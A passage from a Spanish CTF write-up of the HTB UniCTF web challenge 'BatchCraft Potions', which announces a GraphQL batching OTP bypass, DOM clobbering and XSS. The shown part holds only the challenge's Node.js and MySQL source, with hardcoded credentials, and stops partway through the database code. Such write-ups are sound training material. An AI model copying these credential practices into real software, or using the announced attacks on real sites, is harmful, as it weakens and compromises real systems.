<!doctype html><html lang="es"><head><title>BatchCraft Potions | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Ataque de GraphQL batching. Bypass de OTP y límite de peticiones. JWT. CSP. DOM Clobbering. XSS"><meta itemprop="description" content="Ataque de GraphQL batching. Bypass de OTP y límite de peticiones. JWT. CSP. DOM Clobbering. XSS"><meta name="twitter:card" content="Ataque de GraphQL batching. Bypass de OTP y límite de peticiones. JWT. CSP. DOM Clobbering. XSS"><meta name="twitter:description" content="Ataque de GraphQL batching. Bypass de OTP y límite de peticiones. JWT. CSP. DOM Clobbering. XSS"><meta property="og:description" content="Ataque de GraphQL batching. Bypass de OTP y límite de peticiones. JWT. CSP. DOM Clobbering. XSS"><meta property="og:type" content="website"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/web.png"><meta name="twitter:image" content="https://7rocky.github.io/images/web.png"><meta property="og:image" content="https://7rocky.github.io/images/web.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="BatchCraft Potions"><meta property="twitter:title" content="BatchCraft Potions"><meta property="og:title" content="BatchCraft Potions"><meta property="og:url" content="https://7rocky.github.io/ctf/other/htb-unictf/batchcraft-potions/"><meta itemprop="keywords" content><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/other/htb-unictf/batchcraft-potions/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB UNICTF</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/other/htb-unictf/batchcraft-potions/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/other/htb-unictf/batchcraft-potions/&text=BatchCraft%20Potions" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/ctf/other/htb-unictf/batchcraft-potions/&title=BatchCraft%20Potions" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">BatchCraft Potions</h1><p class="mb4 f6 dib tracked">22 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-de-código-estático">Análisis de código estático</a><ul><li><a href="#implementación-de-la-base-de-datos">Implementación de la base de datos</a></li><li><a href="#implementación-de-otp">Implementación de OTP</a></li><li><a href="#rutas-disponibles">Rutas disponibles</a></li></ul></li><li><a href="#atacando-graphql">Atacando GraphQL</a><ul><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a></li><li><a href="#más-análisis-de-código-fuente">Más análisis de código fuente</a></li></ul></li><li><a href="#ocasionando-un-xss">Ocasionando un XSS</a><ul><li><a href="#intentos-fallidos">Intentos fallidos</a></li><li><a href="#dom-_clobbering_">DOM <em>Clobbering</em></a></li><li><a href="#planeando-el-ataque">Planeando el ataque</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Tenemos este sitio web:</p><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-1.png" alt="BatchCraft Potions 1"></p><h2 id="análisis-de-código-estático">Análisis de código estático</h2><p>Se nos proporciona el código fuente de JavaScript de la aplicación web, creada con Node.js y Express JS. Esto es <code>index.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1">       </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'express'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">app</span><span class="mtk1">           </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">express</span><span class="mtk1">();</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">path</span><span class="mtk1">          </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'path'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">cookieParser</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'cookie-parser'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> nunjucks      </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'nunjucks'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> routes        </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'./routes'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> Database      </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'./database'</span><span class="mtk1">);</span>
<span class="mtk1">global</span><span class="mtk1">.db           </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">Database</span><span class="mtk1">();</span>

<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">json</span><span class="mtk1">());</span>
<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk8">cookieParser</span><span class="mtk1">());</span>

<span class="mtk1">nunjucks.</span><span class="mtk8">configure</span><span class="mtk1">(</span><span class="mtk4">'views'</span><span class="mtk1">, {</span>
<span class="mtk1">  </span><span class="mtk1">autoescape</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">,</span>
<span class="mtk1">  </span><span class="mtk1">express</span><span class="mtk1">: </span><span class="mtk1">app</span>
<span class="mtk1">});</span>

<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">set</span><span class="mtk1">(</span><span class="mtk4">'views'</span><span class="mtk1">, </span><span class="mtk4">'./views'</span><span class="mtk1">);</span>
<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk4">'/static'</span><span class="mtk1">, </span><span class="mtk8">express</span><span class="mtk1">.</span><span class="mtk8">static</span><span class="mtk1">(</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk4">'static'</span><span class="mtk1">)));</span>
<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">set</span><span class="mtk1">(</span><span class="mtk4">'etag'</span><span class="mtk1">, </span><span class="mtk6">false</span><span class="mtk1">);</span>

<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">use</span><span class="mtk1">(</span><span class="mtk8">routes</span><span class="mtk1">());</span>

<span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">all</span><span class="mtk1">(</span><span class="mtk4">'*'</span><span class="mtk1">, (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">404</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">({</span>
<span class="mtk1">    </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">'404 page not found'</span>
<span class="mtk1">  });</span>
<span class="mtk1">});</span>

<span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">global</span><span class="mtk1">.db.</span><span class="mtk8">connect</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">global</span><span class="mtk1">.db.</span><span class="mtk8">migrate</span><span class="mtk1">();</span>
<span class="mtk1">  </span><span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">listen</span><span class="mtk1">(</span><span class="mtk6">1337</span><span class="mtk1">, </span><span class="mtk4">'0.0.0.0'</span><span class="mtk1">, () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">'Listening on port 1337'</span><span class="mtk1">));</span>  
<span class="mtk1">})();</span>
</code></pre></div><p>Este es un <em>script</em> normal. Referencia a <code>routes/index.js</code> y <code>database.js</code>.</p><h3 id="implementación-de-la-base-de-datos">Implementación de la base de datos</h3><p>Este es un archivo grande, pero lo dejo aquí en caso de que desee analizarlo en profundidad:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> mysql     </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'mysql'</span><span class="mtk1">)</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8 mtku">crypto</span><span class="mtk1">    </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'crypto'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> OTPHelper </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'./helpers/OTPHelper'</span><span class="mtk1">);</span>

<span class="mtk7 mtki">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Database</span><span class="mtk1"> {</span>

<span class="mtk1">  </span><span class="mtk7 mtki">constructor</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk9">this</span><span class="mtk1">.connection </span><span class="mtk5">=</span><span class="mtk1"> mysql.</span><span class="mtk8">createConnection</span><span class="mtk1">({</span>
<span class="mtk1">      </span><span class="mtk1">host</span><span class="mtk1">: </span><span class="mtk4">'127.0.0.1'</span><span class="mtk1">,</span>
<span class="mtk1">      </span><span class="mtk1">user</span><span class="mtk1">: </span><span class="mtk4">'batchcraftpotions'</span><span class="mtk1">,</span>
<span class="mtk1">      </span><span class="mtk1">password</span><span class="mtk1">: </span><span class="mtk4">'batchcraftpotions'</span><span class="mtk1">,</span>
<span class="mtk1">      </span><span class="mtk1">database</span><span class="mtk1">: </span><span class="mtk4">'batchcraftpotions'</span>
<span class="mtk1">    });</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">connect</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">((</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">)</span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk9">this</span><span class="mtk1">.connection.</span><span class="mtk8">connect</span><span class="mtk1">((</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">          </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk8">resolve</span><span class="mtk1">()</span>
<span class="mtk1">      });</span>
<span class="mtk1">    })</span>
<span class="mtk1">  }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">migrate</span><span class="mtk1">() {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">otpkey</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> OTPHelper.</span><span class="mtk8">genSecret</span><span class="mtk1">();</span>

<span class="mtk1">        </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`INSERT IGNORE INTO users(username, password, otpk</span><span class="mtk4">ey, is_admin) VALUES(?, ?, ?, ?)`</span><span class="mtk1">;</span>  
<span class="mtk1">        </span><span class="mtk9">this</span><span class="mtk1">.connection.</span><span class="mtk8">query</span><span class="mtk1">(</span>
<span class="mtk1">            </span><span class="mtk1">stmt</span><span class="mtk1">,</span>
<span class="mtk1">            [</span>
<span class="mtk1">                </span><span class="mtk4">'vendor53'</span><span class="mtk1">,</span>
<span class="mtk1">                </span><span class="mtk4">'PotionsFTW!'</span><span class="mtk1">,</span>
<span class="mtk1">                </span><span class="mtk1">otpkey</span><span class="mtk1">,</span>
<span class="mtk1">                </span><span class="mtk6">0</span>
<span class="mtk1">            ],</span>
<span class="mtk1">            (</span><span class="mtk9 mtki">err</span><span class="mtk1">, </span><span class="mtk9 mtki">_</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                    </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">);</span>
<span class="mtk1">            }</span>
<span class="mtk1">        )</span>
<span class="mtk1">  }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">loginUser</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">, </span><span class="mtk9 mtki">password</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`SELECT username, otpkey FROM users WHERE username</span><span class="mtk4"> = ? and password = ?`</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk9">this</span><span class="mtk1">.connection.</span><span class="mtk8">query</span><span class="mtk1">(</span>
<span class="mtk1">                </span><span class="mtk1">stmt</span><span class="mtk1">,</span>
<span class="mtk1">                [</span>
<span class="mtk1">                    </span><span class="mtk7 mtki">String</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">),</span>
<span class="mtk1">                    </span><span class="mtk7 mtki">String</span><span class="mtk1">(</span><span class="mtk9 mtki">password</span><span class="mtk1">)</span>
<span class="mtk1">                ],</span>
<span class="mtk1">                (</span><span class="mtk9 mtki">err</span><span class="mtk1">, </span><span class="mtk9 mtki">result</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">parse</span><span class="mtk1">(</span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">(</span><span class="mtk9 mtki">result</span><span class="mtk1">)))</span>
<span class="mtk1">                    }</span>
<span class="mtk1">                    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">)</span>
<span class="mtk1">                    }</span>
<span class="mtk1">          }</span>
<span class="mtk1">            )</span>
<span class="mtk1">    });</span>
<span class="mtk1">  }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">getUser</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">`SELECT * FROM users WHERE username = ?`</span><span class="mtk1">;</span>
<span class="mtk1">      </span><span class="mtk9">this</span><span class="mtk1">.connection.</span><span class="mtk8">query</span><span class="mtk1">(</span>
<span class="mtk1">                </span><span class="mtk1">stmt</span><span class="mtk1">,</span>
<span class="mtk1">                [</span>
<span class="mtk1">                    </span><span class="mtk7 mtki">String</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">)</span>
<span class="mtk1">                ],</span>
<span class="mtk1">                (</span><span class="mtk9 mtki">err</span><span class="mtk1">, </span><span class="mtk9 mtki">result</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)</span>
<span class="mtk1">                    </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk8">resolve</span><span class="mtk1">(</span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">parse</span><span class="mtk1">(</span><span class="mtk1">JSON</span><span class="mtk1">.</span><span class="mtk8">stringify</span><span class="mtk1">(</span><span class="mtk9 mtki">result</span><span class="mtk1">)))</span>
<span class="mtk1">                    }</span>
<span class="mtk1">                    </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">)</span>
<span class="mtk1">                    }</span>
<span class="mtk1">          }</span>
<span class="mtk1">            )</span>
<span class="mtk1">    });</span>
<span class="mtk1">  }</span>

<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">getOTPKey</span><span class="mtk1">(</span><span class="mtk9 mtki">username</span><span class="mtk1">) {</span>
